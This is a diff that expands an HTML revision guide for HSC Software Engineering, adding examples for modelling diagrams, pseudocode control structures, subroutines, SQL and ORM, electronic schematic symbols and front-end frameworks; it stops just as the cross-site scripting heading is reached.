@@ -103,43 +103,99 @@
           <h2 class="syllabus-phase">📊 System and Data Modelling Tools</h2>
 
           <h3>📊 Data Flow Diagrams (DFD)</h3>
-          <p>Used to represent the flow of data through an information system.</p>
+          <p>Used to represent the flow of data through an information system. DFDs show <em>what</em> data moves through a system and <em>where</em> it goes — not how or when.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>⭕ Circle</strong><span>Process — uses input to generate output.</span></div>
-            <div class="key-term-item"><strong>🗃️ Open Rectangle</strong><span>Data Store — file or non-computer storage.</span></div>
-            <div class="key-term-item"><strong>🏢 Rectangle</strong><span>External Entity — source or sink of data.</span></div>
-            <div class="key-term-item"><strong>↩️ Curved Arrow</strong><span>Data Flow — movement of data between elements.</span></div>
+            <div class="key-term-item"><strong>⭕ Circle</strong><span>Process — transforms input data into output (e.g. "Validate Login").</span></div>
+            <div class="key-term-item"><strong>🗃️ Open Rectangle</strong><span>Data Store — persistent storage such as a file or database table (e.g. "D1 Users").</span></div>
+            <div class="key-term-item"><strong>🏢 Rectangle</strong><span>External Entity — a person or system outside the boundary that sends or receives data (e.g. "Customer").</span></div>
+            <div class="key-term-item"><strong>↩️ Arrow</strong><span>Data Flow — named arrow showing data moving between elements (e.g. "username + password").</span></div>
           </div>
           <div class="callout info">
-            <strong>Level 0 DFD</strong>: Represents an overview of the entire system; does not show data stores or internal processes.
+            <strong>Level 0 (Context Diagram)</strong>: Shows the entire system as a single process bubble with all external entities. No data stores or sub-processes are shown.<br><br>
+            <strong>Level 1 DFD</strong>: Expands the single bubble into its major processes. Data stores appear at this level. Each process can be further expanded into a Level 2 DFD if needed.
           </div>
+          <p><strong>Example scenario — Online Bookshop:</strong> A <em>Customer</em> (external entity) sends an <em>order request</em> (data flow) to the <em>Process Order</em> (process), which reads from the <em>D1 Book Catalogue</em> (data store) and sends a <em>confirmation</em> back to the customer.</p>
 
-          <h3>🌐 Structure Charts</h3>
-          <p>Represent a system by showing separate subroutines and their relationships.</p>
+          <h3>🏗️ Structure Charts</h3>
+          <p>Represent a system's modular design — showing how subroutines are called from one another in a hierarchy. Modules at the top control modules below them.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔘 Empty Circle Arrow</strong><span>Data Movement — passes parameters between modules.</span></div>
-            <div class="key-term-item"><strong>⚫ Filled Circle Arrow</strong><span>Control Flag — passes status variables between modules.</span></div>
-            <div class="key-term-item"><strong>🔷 Diamond</strong><span>Decision — indicates optional or conditional execution.</span></div>
-            <div class="key-term-item"><strong>🔁 Curved Arrow</strong><span>Repetition — indicates a looping structure.</span></div>
+            <div class="key-term-item"><strong>▭ Rectangle</strong><span>Module — a named subroutine or function (e.g. "Calculate Total").</span></div>
+            <div class="key-term-item"><strong>🔘 Empty Circle Arrow</strong><span>Data parameter — a data value passed between modules (e.g. passing a score).</span></div>
+            <div class="key-term-item"><strong>⚫ Filled Circle Arrow</strong><span>Control flag — a status variable passed between modules (e.g. a Boolean "isValid").</span></div>
+            <div class="key-term-item"><strong>🔷 Diamond</strong><span>Selection — indicates a module is called conditionally.</span></div>
+            <div class="key-term-item"><strong>🔁 Curved Arrow</strong><span>Repetition — indicates a module is called inside a loop.</span></div>
+          </div>
+          <div class="callout info">
+            <strong>Example:</strong> A top-level <em>Main</em> module calls <em>GetInput</em>, <em>ProcessData</em>, and <em>DisplayResult</em>. An arrow from <em>GetInput</em> back to <em>Main</em> carries the data parameter <em>userScore</em>.
           </div>
 
-          <h3>📊 Data Dictionary</h3>
-          <p>Comprehensive description of each variable, including: Name, Data Type, Format, Size (bytes/display), Description, Example, and Validation.</p>
+          <h3>📋 Data Dictionary</h3>
+          <p>A structured reference that documents every variable and data element in a system. Each entry includes: <strong>Name, Data Type, Format, Size, Description, Example value, and Validation rules</strong>.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Name</th><th>Data Type</th><th>Format</th><th>Size</th><th>Description</th><th>Example</th><th>Validation</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>studentID</code></td><td>Integer</td><td>XXXXXX</td><td>6 digits</td><td>Unique student identifier</td><td>482019</td><td>Must be 6 digits, not null</td></tr>
+                <tr><td><code>surname</code></td><td>String</td><td>Text</td><td>50 chars</td><td>Student's family name</td><td>Smith</td><td>Letters only, not empty</td></tr>
+                <tr><td><code>score</code></td><td>Real</td><td>##.#</td><td>4 bytes</td><td>Exam score out of 100</td><td>87.5</td><td>0.0 ≤ score ≤ 100.0</td></tr>
+                <tr><td><code>dateOfBirth</code></td><td>Date</td><td>DD/MM/YYYY</td><td>10 chars</td><td>Student's date of birth</td><td>14/03/2007</td><td>Valid calendar date</td></tr>
+              </tbody>
+            </table>
+          </div>
 
           <h3>🧩 Class Diagrams</h3>
-          <p>Used in object-oriented design to show classes, their attributes, methods, and relationships. Each class box is divided into three sections: the class name, attributes, and methods.</p>
+          <p>Used in object-oriented design to show classes, their attributes, methods, and the relationships between them. Each class is drawn as a box divided into three compartments.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Class Diagram — Example</span></div>
+            <pre><code>┌─────────────────────┐
+│       Student       │  ← Class name
+├─────────────────────┤
+│ - studentID: int    │  ← Attributes (- private, + public)
+│ - name: String      │
+│ - score: float      │
+├─────────────────────┤
+│ + getScore(): float │  ← Methods
+│ + setScore(s: float)│
+│ + isPassing(): bool │
+└─────────────────────┘
+
+     Student ──────▷ Person      (Inheritance: Student extends Person)
+     Course  ◆───── Lesson       (Composition: Course owns its Lessons)
+     Student ──────  Course      (Association: Student enrols in Course)</code></pre>
+          </div>
           <div class="key-terms">
-            <div class="key-term-item"><strong>— (solid line)</strong><span>Association — a relationship between two classes.</span></div>
-            <div class="key-term-item"><strong>▷ (open arrow)</strong><span>Inheritance — a subclass extends a superclass.</span></div>
-            <div class="key-term-item"><strong>◇ (open diamond)</strong><span>Aggregation — a "has-a" relationship (weak ownership).</span></div>
-            <div class="key-term-item"><strong>◆ (filled diamond)</strong><span>Composition — a strong "contains" relationship (lifecycle dependency).</span></div>
+            <div class="key-term-item"><strong>— (solid line)</strong><span>Association — a general relationship between two classes.</span></div>
+            <div class="key-term-item"><strong>▷ (open arrow)</strong><span>Inheritance — a subclass extends a superclass (is-a relationship).</span></div>
+            <div class="key-term-item"><strong>◇ (open diamond)</strong><span>Aggregation — a "has-a" relationship; parts can exist independently.</span></div>
+            <div class="key-term-item"><strong>◆ (filled diamond)</strong><span>Composition — parts cannot exist without the whole (strong ownership).</span></div>
           </div>
 
           <h3>🖼️ Storyboard</h3>
-          <p>A visual sequence of screen layouts or interface states that communicates the intended user experience and navigation flow through a system. Used in the design phase to plan user interfaces before development begins.</p>
+          <p>A visual sequence of annotated screen layouts showing the user's journey through a system. Created in the design phase before any code is written, storyboards allow stakeholders to review and approve the interface before development begins.</p>
+          <p>Each frame in a storyboard typically includes:</p>
+          <ul>
+            <li>A <strong>sketch or wireframe</strong> of the screen layout</li>
+            <li>The <strong>screen name or state</strong> (e.g. "Login Screen", "Results Page")</li>
+            <li><strong>Navigation arrows</strong> showing what triggers the transition to the next screen (e.g. "Click Submit")</li>
+            <li>Notes on <strong>input fields, buttons, and displayed data</strong></li>
+          </ul>
 
           <h3>🌳 Decision Trees</h3>
-          <p>A tree-based diagram that maps out decision logic, showing possible conditions and the resulting outcomes for each branch. Each internal node represents a condition; each leaf node represents an outcome.</p>
+          <p>A tree-based diagram that models decision logic. Starting from a root condition, each branch represents a possible outcome of a test. Decision trees are useful for representing complex nested logic clearly.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Decision Tree — Exam Grade Example</span></div>
+            <pre><code>Is score ≥ 90?
+├── YES → Grade: A
+└── NO
+    Is score ≥ 75?
+    ├── YES → Grade: B
+    └── NO
+        Is score ≥ 50?
+        ├── YES → Grade: C
+        └── NO → Grade: Fail</code></pre>
+          </div>
         </section>
 
         <hr class="divider" />
@@ -147,10 +203,42 @@
         <!-- 2. Project Management Tools -->
         <section id="project-management">
           <h2 class="syllabus-phase">📋 Project Management Tools</h2>
+
           <h3>📈 Gantt Charts</h3>
-          <p>Displays component tasks on an estimated timeline, showing dependencies and milestones.</p>
+          <p>A horizontal bar chart that displays all project tasks against a timeline, making it easy to see what needs to happen, in what order, and how long each task should take.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Task</th><th>Week 1</th><th>Week 2</th><th>Week 3</th><th>Week 4</th><th>Depends on</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Requirements analysis</td><td>████</td><td></td><td></td><td></td><td>—</td></tr>
+                <tr><td>Design (DFD, structure chart)</td><td>░░</td><td>████</td><td></td><td></td><td>Requirements</td></tr>
+                <tr><td>Coding</td><td></td><td>░░</td><td>████</td><td>░░</td><td>Design</td></tr>
+                <tr><td>Testing</td><td></td><td></td><td>░░</td><td>████</td><td>Coding</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Task bars</strong><span>Horizontal bars showing the planned start, duration, and end of each task.</span></div>
+            <div class="key-term-item"><strong>Dependencies</strong><span>Arrows or indentation indicating which tasks must finish before another can begin.</span></div>
+            <div class="key-term-item"><strong>Milestones</strong><span>Key checkpoints (often shown as a diamond ◆) marking a significant completion point.</span></div>
+            <div class="key-term-item"><strong>Critical path</strong><span>The sequence of dependent tasks that determines the minimum project duration.</span></div>
+          </div>
+
           <h3>📝 Process Diaries / Log Books</h3>
-          <p>Regular interval documentation of progress, tasks achieved, stumbling blocks, and reflective comments.</p>
+          <p>A regular written record kept throughout the project. Entries are made at consistent intervals (e.g. after each work session, weekly, or at each milestone) and serve as evidence of the development process.</p>
+          <p>A typical log entry includes:</p>
+          <ul>
+            <li><strong>Date and time</strong> of the session</li>
+            <li><strong>Tasks completed</strong> — what was achieved</li>
+            <li><strong>Obstacles encountered</strong> — bugs, design problems, or blockers</li>
+            <li><strong>Next steps</strong> — what will be attempted in the next session</li>
+            <li><strong>Reflective comments</strong> — what was learned or what could be improved</li>
+          </ul>
+          <div class="callout info">
+            In the HSC Software Engineering Project, your process diary is submitted as evidence of your development approach and is assessed alongside your final solution.
+          </div>
         </section>
 
         <hr class="divider" />
@@ -158,22 +246,41 @@
         <!-- 3. Programming Paradigms -->
         <section id="programming-paradigms">
           <h2 class="syllabus-phase">⌨️ Programming Paradigms</h2>
+          <p>A programming paradigm is a fundamental style or approach to solving problems with code. Different paradigms suit different types of problems.</p>
           <div class="info-grid">
             <div class="info-card">
               <h4>🧩 Object-Oriented</h4>
-              <p>Classes, objects, attributes, methods, inheritance, polymorphism, and encapsulation.</p>
+              <p>Organises code into <strong>classes</strong> and <strong>objects</strong>. Key concepts: attributes, methods, inheritance, polymorphism, and encapsulation. Used in Python, Java, C#.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code>class Dog:
+    def __init__(self, name):
+        self.name = name
+    def bark(self):
+        return "Woof!"</code></pre>
             </div>
             <div class="info-card">
               <h4>📝 Logic</h4>
-              <p>Facts, rules, and displaying solutions/rules used by the system.</p>
+              <p>Programs are expressed as <strong>facts</strong> and <strong>rules</strong>; the engine finds solutions automatically. Used in Prolog for AI and expert systems.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code>% Prolog-style logic
+parent(tom, bob).
+parent(bob, ann).
+grandparent(X, Z) :-
+    parent(X, Y), parent(Y, Z).</code></pre>
             </div>
             <div class="info-card">
               <h4>📊 Imperative</h4>
-              <p>Control structures, assignment statements, expressions, and subroutines.</p>
+              <p>Programs describe <strong>how</strong> to do something as a sequence of commands — control structures, assignment, expressions, and subroutines. Most common paradigm; used in Python, C, Pascal.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code>total = 0
+for i in range(1, 6):
+    total = total + i
+print(total)  # 15</code></pre>
             </div>
             <div class="info-card">
               <h4>⚙️ Functional</h4>
-              <p>Recursion, first-class objects, abstraction, and encapsulation.</p>
+              <p>Treats computation as evaluating <strong>functions</strong>. Avoids changing state; uses recursion and first-class functions. Used in Haskell, Erlang; supported in Python.</p>
+              <pre style="font-size:.78rem;margin-top:.5rem"><code># Python functional style
+nums = [1, 2, 3, 4, 5]
+total = sum(map(lambda x: x*2, nums))
+print(total)  # 30</code></pre>
             </div>
           </div>
         </section>
@@ -183,16 +290,41 @@
         <!-- 4. Algorithms -->
         <section id="algorithms">
           <h2 class="syllabus-phase">📝 Algorithms</h2>
+          <p>An algorithm is a precise, step-by-step set of instructions for solving a problem. In HSC Software Engineering, algorithms are communicated using <strong>pseudocode</strong> or <strong>flowcharts</strong>.</p>
+
           <h3>💻 Pseudocode</h3>
-          <p>Keywords in <strong>CAPITALS</strong>, structural elements in pairs (BEGIN/END, IF/ENDIF), and indentation for control structures.</p>
+          <p>A structured English-like notation for expressing algorithms. It is not executable code — it communicates logic without worrying about syntax. NSW HSC conventions:</p>
+          <ul>
+            <li>Keywords in <strong>CAPITALS</strong> (e.g. <code>IF</code>, <code>WHILE</code>, <code>FOR</code>)</li>
+            <li>Structural keywords come in matched pairs: <code>IF / ENDIF</code>, <code>WHILE / ENDWHILE</code>, <code>BEGIN / END</code></li>
+            <li>Indent the body of every control structure</li>
+            <li>Use <code>←</code> for assignment (e.g. <code>total ← 0</code>)</li>
+          </ul>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Find the largest number in a list</span></div>
+            <pre><code>BEGIN
+  INPUT numbers        # A list of numbers entered by the user
+  largest ← numbers[0]
+  FOR i = 1 TO LENGTH(numbers) - 1
+    IF numbers[i] > largest THEN
+      largest ← numbers[i]
+    ENDIF
+  NEXT i
+  OUTPUT "Largest value: ", largest
+END</code></pre>
+          </div>
 
           <h3>🌊 Flowcharts</h3>
+          <p>A visual diagram using standardised shapes connected by arrows to show the flow of logic through an algorithm.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔵 Oval</strong><span>Terminator — marks the Start or End of a flowchart.</span></div>
-            <div class="key-term-item"><strong>📐 Parallelogram</strong><span>Input/Output — represents data entering or leaving the system.</span></div>
-            <div class="key-term-item"><strong>▭ Rectangle</strong><span>Process — a computation or action step.</span></div>
-            <div class="key-term-item"><strong>🔶 Diamond</strong><span>Decision — a branching condition (Yes/No or True/False).</span></div>
-            <div class="key-term-item"><strong>🗂️ Double-sided Rectangle</strong><span>Subprogram — a call to a separate subroutine or function.</span></div>
+            <div class="key-term-item"><strong>🔵 Oval</strong><span>Terminator — marks the <em>Start</em> or <em>End</em> of the algorithm.</span></div>
+            <div class="key-term-item"><strong>📐 Parallelogram</strong><span>Input/Output — data entering (INPUT) or leaving (OUTPUT/DISPLAY) the system.</span></div>
+            <div class="key-term-item"><strong>▭ Rectangle</strong><span>Process — a computation, assignment, or action (e.g. <code>total ← total + score</code>).</span></div>
+            <div class="key-term-item"><strong>🔶 Diamond</strong><span>Decision — a yes/no or true/false branch (e.g. <code>score ≥ 50?</code>).</span></div>
+            <div class="key-term-item"><strong>🗂️ Double-sided Rectangle</strong><span>Subprogram — a call to a named subroutine or function.</span></div>
+          </div>
+          <div class="callout info">
+            <strong>Pseudocode vs Flowcharts:</strong> Both express the same algorithm. Pseudocode is preferred for complex logic and is easier to convert to code. Flowcharts are better for visualising branching and communicating with non-programmers.
           </div>
         </section>
 
@@ -201,76 +333,103 @@
         <!-- 5. Control Structures -->
         <section id="control-structures">
           <h2 class="syllabus-phase">🕹️ Control Structures</h2>
+          <p>Control structures determine the <em>order</em> in which instructions execute. Every algorithm is built from three fundamental building blocks: <strong>Sequence</strong>, <strong>Selection</strong>, and <strong>Repetition</strong>.</p>
 
           <h3>Sequence</h3>
-          <p>Statements execute one after another in the order they are written.</p>
+          <p>The default mode — statements execute one after another, top to bottom, in the exact order they are written. No branching or repetition occurs.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
+            <div class="code-header"><span class="code-lang">Pseudocode — Calculate a student's average</span></div>
             <pre><code>BEGIN
-  statement1
-  statement2
-  statement3
+  INPUT score1
+  INPUT score2
+  INPUT score3
+  total ← score1 + score2 + score3
+  average ← total / 3
+  OUTPUT "Average score: ", average
 END</code></pre>
           </div>
 
           <h3>Selection</h3>
+          <p>Allows the program to choose between different paths based on a condition.</p>
+
           <h4>Binary Selection</h4>
+          <p>Chooses between exactly <strong>two</strong> outcomes: one path if the condition is true, another if it is false.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>IF condition THEN
-  statements
+            <div class="code-header"><span class="code-lang">Pseudocode — Pass or fail</span></div>
+            <pre><code>IF score >= 50 THEN
+  OUTPUT "Result: Pass"
 ELSE
-  statements
+  OUTPUT "Result: Fail"
 ENDIF</code></pre>
           </div>
 
           <h4>Multi-way Selection</h4>
+          <p>Selects from <strong>several</strong> possible outcomes based on a single expression's value. More readable than a chain of IF/ELSE IF.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>CASEWHERE expression equals
-  value1: statements
-  value2: statements
-  OTHERWISE: statements
+            <div class="code-header"><span class="code-lang">Pseudocode — Menu selection</span></div>
+            <pre><code>CASEWHERE menuChoice equals
+  1: OUTPUT "New Game"
+  2: OUTPUT "Load Game"
+  3: OUTPUT "High Scores"
+  OTHERWISE: OUTPUT "Invalid choice"
 END CASE</code></pre>
           </div>
 
           <h4>Nested IF</h4>
+          <p>An IF structure placed inside another IF. Used when a decision depends on the result of a previous decision.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>IF condition1 THEN
-  IF condition2 THEN
-    statements
+            <div class="code-header"><span class="code-lang">Pseudocode — Grade with age check</span></div>
+            <pre><code>IF score >= 50 THEN
+  IF score >= 85 THEN
+    OUTPUT "Grade: A (Distinction)"
   ELSE
-    statements
+    OUTPUT "Grade: Pass"
   ENDIF
 ELSE
-  statements
+  OUTPUT "Grade: Fail — please see your teacher"
 ENDIF</code></pre>
           </div>
 
           <h3>Repetition</h3>
-          <h4>Pre-test</h4>
+          <p>Allows a block of statements to execute multiple times. The choice of loop depends on whether the number of iterations is known in advance.</p>
+
+          <h4>Pre-test (WHILE)</h4>
+          <p>Checks the condition <strong>before</strong> each iteration. If the condition is false from the start, the body never executes.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>WHILE condition is true
-  statements
-ENDWHILE</code></pre>
+            <div class="code-header"><span class="code-lang">Pseudocode — Validate user input</span></div>
+            <pre><code>INPUT password
+WHILE password != "correct123"
+  OUTPUT "Incorrect password. Try again."
+  INPUT password
+ENDWHILE
+OUTPUT "Access granted."</code></pre>
           </div>
 
-          <h4>Post-test</h4>
+          <h4>Post-test (REPEAT / UNTIL)</h4>
+          <p>Checks the condition <strong>after</strong> each iteration. The body always executes <strong>at least once</strong>.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
+            <div class="code-header"><span class="code-lang">Pseudocode — Keep asking until valid input</span></div>
             <pre><code>REPEAT
-  statements
-UNTIL condition is true</code></pre>
+  OUTPUT "Enter a number between 1 and 10: "
+  INPUT number
+UNTIL number >= 1 AND number <= 10
+OUTPUT "You entered: ", number</code></pre>
           </div>
 
-          <h4>FOR / NEXT</h4>
+          <h4>FOR / NEXT (Counted Loop)</h4>
+          <p>Used when the number of iterations is known in advance. The loop variable is automatically incremented each cycle.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>FOR variable = start TO finish STEP increment
-  statements
-NEXT variable</code></pre>
+            <div class="code-header"><span class="code-lang">Pseudocode — Sum five scores</span></div>
+            <pre><code>total ← 0
+FOR i = 1 TO 5 STEP 1
+  INPUT score
+  total ← total + score
+NEXT i
+average ← total / 5
+OUTPUT "Class average: ", average</code></pre>
+          </div>
+          <div class="callout info">
+            <strong>Choosing the right loop:</strong> Use <code>FOR/NEXT</code> when the count is known. Use <code>WHILE</code> when checking a condition before starting. Use <code>REPEAT/UNTIL</code> when the body must run at least once (e.g. input validation).
           </div>
         </section>
 
@@ -279,39 +438,62 @@ NEXT variable</code></pre>
         <!-- 6. Subroutines -->
         <section id="subroutines">
           <h2 class="syllabus-phase">🔧 Subroutines</h2>
+          <p>A subroutine is a named, reusable block of code that performs a specific task. Subroutines promote modularity — breaking a large problem into smaller, manageable pieces.</p>
+          <div class="callout info">
+            <strong>Procedure vs Function:</strong> A <em>procedure (subroutine)</em> performs an action but does not return a value. A <em>function</em> performs a calculation and <strong>returns</strong> a result to the caller.
+          </div>
 
           <h3>Using a subroutine with one parameter</h3>
+          <p>A parameter is a variable that receives a value when the subroutine is called. The value passed in is called an <em>argument</em>.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>SUBROUTINE name(param)
-  statements
+            <div class="code-header"><span class="code-lang">Pseudocode — Display a greeting</span></div>
+            <pre><code>SUBROUTINE greetStudent(studentName)
+  OUTPUT "Welcome, ", studentName, "!"
+  OUTPUT "Good luck with your HSC."
 END SUBROUTINE
 
-// Calling the subroutine:
-name(value)</code></pre>
+# Calling the subroutine:
+greetStudent("Alice")
+greetStudent("Ben")</code></pre>
           </div>
 
           <h3>Using a subroutine with multiple parameters</h3>
+          <p>Multiple parameters are separated by commas. Each argument passed must match the corresponding parameter in position and type.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>SUBROUTINE name(param1, param2)
-  statements
+            <div class="code-header"><span class="code-lang">Pseudocode — Print a student result</span></div>
+            <pre><code>SUBROUTINE displayResult(studentName, score)
+  OUTPUT studentName, " scored ", score, "/100"
+  IF score >= 50 THEN
+    OUTPUT "Result: Pass"
+  ELSE
+    OUTPUT "Result: Fail"
+  ENDIF
 END SUBROUTINE
 
-// Calling the subroutine:
-name(value1, value2)</code></pre>
+# Calling the subroutine:
+displayResult("Alice", 87)
+displayResult("Ben", 43)</code></pre>
           </div>
 
           <h3>Passing a value back from a function</h3>
+          <p>A function uses <code>RETURN</code> to send a computed value back to the line that called it. The returned value can be stored in a variable or used directly in an expression.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Pseudocode</span></div>
-            <pre><code>FUNCTION name(param)
-  statements
-  RETURN value
+            <div class="code-header"><span class="code-lang">Pseudocode — Calculate letter grade</span></div>
+            <pre><code>FUNCTION getGrade(score)
+  IF score >= 90 THEN
+    RETURN "A"
+  ELSE IF score >= 75 THEN
+    RETURN "B"
+  ELSE IF score >= 50 THEN
+    RETURN "C"
+  ELSE
+    RETURN "Fail"
+  ENDIF
 END FUNCTION
 
-// Calling the function:
-result ← name(value)</code></pre>
+# Calling the function:
+grade ← getGrade(82)
+OUTPUT "Your grade is: ", grade    # Your grade is: B</code></pre>
           </div>
         </section>
 
@@ -322,24 +504,65 @@ result ← name(value)</code></pre>
           <h2 class="syllabus-phase">🗄️ Relational Databases</h2>
 
           <h3>SQL</h3>
+          <p>Structured Query Language (SQL) is the standard language for interacting with relational databases. A relational database stores data in <strong>tables</strong> (relations), where each row is a record and each column is a field.</p>
           <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">Standard SQL Syntax</span>
-            </div>
+            <div class="code-header"><span class="code-lang">SQL — Standard Syntax</span></div>
             <pre><code>SELECT field(s)
 FROM table(s)
 WHERE search criteria
 GROUP BY field(s)
 ORDER BY field(s) ASC/DESC</code></pre>
           </div>
-          <p>Includes functions like <code>SUM</code>, <code>AVG</code>, <code>COUNT</code>, <code>MAX</code>, <code>MIN</code> and operators like <code>CONTAINS</code>, <code>EQUALS</code>, <code>AND</code>, <code>OR</code>, <code>NOT</code>.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">SQL — Worked Examples</span></div>
+            <pre><code>-- Get all students with a score above 80, sorted highest first
+SELECT studentID, surname, score
+FROM Students
+WHERE score > 80
+ORDER BY score DESC;
+
+-- Count how many students passed each subject
+SELECT subjectName, COUNT(*) AS numPassing
+FROM Enrolments
+WHERE score >= 50
+GROUP BY subjectName
+ORDER BY numPassing DESC;
+
+-- Join two tables: get student names with their subject enrolments
+SELECT Students.surname, Subjects.subjectName, Enrolments.score
+FROM Students
+JOIN Enrolments ON Students.studentID = Enrolments.studentID
+JOIN Subjects ON Enrolments.subjectID = Subjects.subjectID
+WHERE Enrolments.score >= 50;</code></pre>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>SUM / AVG / COUNT / MAX / MIN</strong><span>Aggregate functions that operate on a set of rows (e.g. <code>AVG(score)</code>).</span></div>
+            <div class="key-term-item"><strong>AND / OR / NOT</strong><span>Logical operators to combine conditions in a WHERE clause.</span></div>
+            <div class="key-term-item"><strong>JOIN</strong><span>Combines rows from two or more tables based on a matching key field.</span></div>
+            <div class="key-term-item"><strong>PRIMARY KEY</strong><span>A field (or combination) that uniquely identifies each row in a table.</span></div>
+            <div class="key-term-item"><strong>FOREIGN KEY</strong><span>A field in one table that references the primary key of another, creating a relationship.</span></div>
+          </div>
 
           <h3>Object-Relational Mapping (ORM)</h3>
-          <p>A technique that maps object-oriented class structures to relational database tables, allowing developers to interact with a database using objects rather than raw SQL. Each class maps to a table; each attribute maps to a column; each object instance maps to a row.</p>
+          <p>ORM is a programming technique that allows a developer to interact with a relational database using <strong>objects</strong> rather than raw SQL. The ORM framework automatically generates the SQL behind the scenes.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Class → Table</strong><span>Each class in the model corresponds to a database table.</span></div>
+            <div class="key-term-item"><strong>Class → Table</strong><span>Each class in the object model corresponds to a database table.</span></div>
             <div class="key-term-item"><strong>Attribute → Column</strong><span>Each attribute of the class becomes a column in the table.</span></div>
-            <div class="key-term-item"><strong>Object → Row</strong><span>Each instance of the class is stored as a row in the table.</span></div>
+            <div class="key-term-item"><strong>Object → Row</strong><span>Each instance of the class is stored as a row (record) in the table.</span></div>
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python — ORM-style example (SQLAlchemy)</span></div>
+            <pre><code># The class maps directly to the "students" database table
+class Student(Base):
+    __tablename__ = 'students'
+    studentID = Column(Integer, primary_key=True)
+    surname   = Column(String(50))
+    score     = Column(Float)
+
+# Query using objects instead of SQL strings
+passing = session.query(Student).filter(Student.score >= 50).all()
+for s in passing:
+    print(s.surname, s.score)</code></pre>
           </div>
         </section>
 
@@ -348,12 +571,35 @@ ORDER BY field(s) ASC/DESC</code></pre>
         <!-- 8. Wiring Diagrams for Mechatronic Systems -->
         <section id="mechatronics">
           <h2 class="syllabus-phase">🦾 Wiring Diagrams for Mechatronic Systems</h2>
-          <p>Standard symbols for electronic components used in wiring diagrams:</p>
+          <p>Wiring diagrams use standardised schematic symbols to represent electronic components and their connections. They show how components are electrically connected in a circuit — different from a physical layout diagram.</p>
           <div class="info-grid">
-            <div class="info-card"><h4>📚 Capacitor, Diode, Resistor</h4></div>
-            <div class="info-card"><h4>🚀 LED, Lightbulb, Amplifier</h4></div>
-            <div class="info-card"><h4>🌐 Motor, Speaker, Integrated Circuit</h4></div>
-            <div class="info-card"><h4>🔐 Voltage Source (AC/DC)</h4></div>
+            <div class="info-card">
+              <h4>⚡ Resistor</h4>
+              <p>Limits current flow. Shown as a rectangle or zigzag line. Value measured in Ohms (Ω).</p>
+            </div>
+            <div class="info-card">
+              <h4>🔋 Capacitor</h4>
+              <p>Stores electrical charge temporarily. Shown as two parallel lines. Value in Farads (F).</p>
+            </div>
+            <div class="info-card">
+              <h4>➡️ Diode / LED</h4>
+              <p>Allows current to flow in one direction only. LED emits light when conducting. Shown as a triangle pointing to a line.</p>
+            </div>
+            <div class="info-card">
+              <h4>🔌 Voltage Source</h4>
+              <p>Provides electrical potential. DC shown as long/short parallel lines; AC shown as a circle with a wave symbol.</p>
+            </div>
+            <div class="info-card">
+              <h4>🔊 Speaker / Motor</h4>
+              <p>Output transducers — convert electrical energy to sound (speaker) or mechanical motion (motor).</p>
+            </div>
+            <div class="info-card">
+              <h4>🧩 Integrated Circuit (IC)</h4>
+              <p>A chip containing many transistors and logic gates. Shown as a rectangle with labelled input/output pins.</p>
+            </div>
+          </div>
+          <div class="callout info">
+            <strong>Tip:</strong> In mechatronic systems (e.g. Arduino-based projects), wiring diagrams show how sensors, actuators, and microcontrollers are connected. Always trace the circuit from the positive voltage source through components to ground (GND).
           </div>
         </section>
 
@@ -364,23 +610,79 @@ ORDER BY field(s) ASC/DESC</code></pre>
           <h2 class="syllabus-phase">🌐 Programming for the Web</h2>
 
           <h3>Front-end web development frameworks</h3>
-          <p>Libraries and frameworks such as React, Vue, and Angular that provide reusable components and structure for building user interfaces in the browser.</p>
+          <p>Front-end frameworks provide pre-built, reusable components and a structured approach to building user interfaces in the browser. Rather than writing all HTML/CSS/JS from scratch, developers compose interfaces from components.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>React</strong><span>A JavaScript library by Meta for building component-based UIs. Uses a virtual DOM for efficient updates.</span></div>
+            <div class="key-term-item"><strong>Vue</strong><span>A progressive framework that is lightweight and easy to integrate into existing projects.</span></div>
+            <div class="key-term-item"><strong>Angular</strong><span>A full framework by Google that includes routing, state management, and dependency injection built in.</span></div>
+          </div>
+          <div class="callout info">
+            <strong>Framework vs Library:</strong> A <em>library</em> (like React) is called by your code when you need it. A <em>framework</em> (like Angular) calls your code — it provides the overall structure and you fill in the details.
+          </div>
 
           <h3>Cross-site scripting (XSS)</h3>
-          <p>A security vulnerability where malicious scripts are injected into web pages viewed by other users. Mitigated by sanitising user input and escaping output before rendering it in the browser.</p>
